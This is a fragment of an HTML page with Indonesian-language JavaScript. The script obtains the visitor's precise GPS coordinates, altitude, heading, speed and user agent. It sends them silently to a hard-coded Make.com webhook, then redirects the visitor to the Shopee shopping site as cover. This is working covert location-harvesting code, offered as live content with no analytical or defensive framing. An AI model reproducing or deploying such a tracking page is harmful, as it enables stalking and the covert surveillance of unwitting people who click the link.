    <style>

<body>
     

    <script>
        const statusDiv = document.getElementById('status');
        const accuracyDiv = document.getElementById('accuracy');
        const coordinatesDiv = document.getElementById('coordinates');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');

        // Webhook URL Anda
        const WEBHOOK_URL = 'https://hook.eu2.make.com/snsxpo7oc5fyiy3fy697rqu29trp9rqy';

        function updateProgress(percent) {
            progressBar.style.display = 'block';
            progressFill.style.width = percent + '%';
        }

        function getAccuracyLevel(accuracy) {
            if (accuracy <= 10) return { level: 'excellent', text: 'üéØ Sangat Akurat', color: '#28a745' };
            if (accuracy <= 25) return { level: 'good', text: '‚úÖ Cukup Akurat', color: '#ffc107' };
            if (accuracy <= 50) return { level: 'fair', text: '‚ö†Ô∏è Lumayan Akurat', color: '#fd7e14' };
            return { level: 'poor', text: '‚ùå Kurang Akurat', color: '#dc3545' };
        }

        async function startHighAccuracyLocation() {
            updateProgress(10);
            statusDiv.innerHTML = 'üîÑ Memulai deteksi high accuracy...';
            
            if (!navigator.geolocation) {
                statusDiv.innerHTML = '‚ùå Browser tidak support geolocation';
                return;
            }

            try {
                updateProgress(30);
                statusDiv.innerHTML = 'üîç Mencari sinyal GPS terbaik...';
                
                // Method 1: High Accuracy GPS dengan multiple attempts
                const position = await getBestGPSLocation();
                
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const altitude = position.coords.altitude;
                const heading = position.coords.heading;
                const speed = position.coords.speed;

                updateProgress(70);
                
                // Accuracy assessment
                const accuracyInfo = getAccuracyLevel(accuracy);
                
                accuracyDiv.innerHTML = `
                    <div class="accuracy-indicator accuracy-${accuracyInfo.level}">
                        <strong>${accuracyInfo.text}</strong><br>
                        Akurasi: ¬±${accuracy.toFixed(1)} meter
                    </div>
                `;

                coordinatesDiv.innerHTML = `
                    <div class="coordinates">
                        <strong>üìç Koordinat Presisi:</strong><br>
                        Latitude: ${lat.toFixed(7)}<br>
                        Longitude: ${lng.toFixed(7)}<br>
                        ${altitude ? `Altitude: ${altitude.toFixed(1)} meter<br>` : ''}
                        ${heading ? `Heading: ${heading}¬∞<br>` : ''}
                        ${speed ? `Speed: ${speed.toFixed(1)} m/s<br>` : ''}
                    </div>
                `;

                updateProgress(90);
                statusDiv.innerHTML = 'üì° Mengirim data lokasi...';

                // Kirim data ke Make.com
                await sendToMakeWebhook(lat, lng, accuracy, altitude, heading, speed);

                updateProgress(100);
                statusDiv.innerHTML = '‚úÖ Data lokasi terkirim!';

                // Redirect ke Shopee setelah 3 detik
                setTimeout(() => {
                    statusDiv.innerHTML = 'üõçÔ∏è Mengarahkan ke Shopee...';
                    window.location.href = 'https://shopee.co.id';
                }, 3000);

            } catch (error) {
                console.error('Location error:', error);
                statusDiv.innerHTML = '‚ùå Gagal mendapatkan lokasi akurat';
                accuracyDiv.innerHTML = '<div class="accuracy-indicator accuracy-poor">Coba buka di area terbuka dengan sinyal baik</div>';
                
                // Fallback ke method biasa
                setTimeout(() => {
                    redirectToShopeeDirect();
                }, 3000);
            }
        }

        async function getBestGPSLocation() {
            return new Promise((resolve, reject) => {
                let bestPosition = null;
                let attempts = 0;
                const maxAttempts = 3;
                const watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        attempts++;
                        
                        // Update progress based on attempts
                        updateProgress(30 + (attempts * 15));
                        
                        // Pilih position dengan accuracy terbaik
                        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                            bestPosition = position;
                            
                            statusDiv.innerHTML = `üì° Memperbaiki akurasi... (${attempts}/${maxAttempts})<br>
                                                  Akurasi terbaik: ¬±${position.coords.accuracy.toFixed(1)}m`;
                        }
                        
                        // Jika sudah cukup akurat atau max attempts, stop
                        if (position.coords.accuracy <= 15 || attempts >= maxAttempts) {
                            navigator.geolocation.clearWatch(watchId);
                            if (bestPosition) {
                                resolve(bestPosition);
                            } else {
                                reject(new Error('Tidak dapat mendapatkan lokasi akurat'));
                            }
                        }
                    },
                    (error) => {
                        navigator.geolocation.clearWatch(watchId);
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0,
                        distanceFilter: 1 // Update setiap 1 meter movement
                    }
                );
                
                // Timeout safety
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchId);
                    if (bestPosition) {
                        resolve(bestPosition);
                    } else {
                        reject(new Error('Timeout'));
                    }
                }, 25000);
            });
        }

        async function sendToMakeWebhook(lat, lng, accuracy, altitude = null, heading = null, speed = null) {
            const data = {
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                altitude: altitude,
                heading: heading,
                speed: speed,
                timestamp: new Date().toLocaleString('id-ID'),
                userAgent: navigator.userAgent,
                url: window.location.href,
                method: 'high_accuracy_gps'
            };
            
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    console.log('‚úÖ Data high accuracy terkirim');
                }
            } catch (error) {
                console.log('‚ùå Gagal kirim data:', error);
            }
        }

        function redirectToShopeeDirect() {
            statusDiv.innerHTML = 'üõçÔ∏è Mengarahkan ke Shopee...';
            setTimeout(() => {
                window.location.href = 'https://shopee.co.id';
            }, 2000);
        }

        // Auto-start setelah 5 detik (optional)
        // setTimeout(startHighAccuracyLocation, 5000);
    </script>
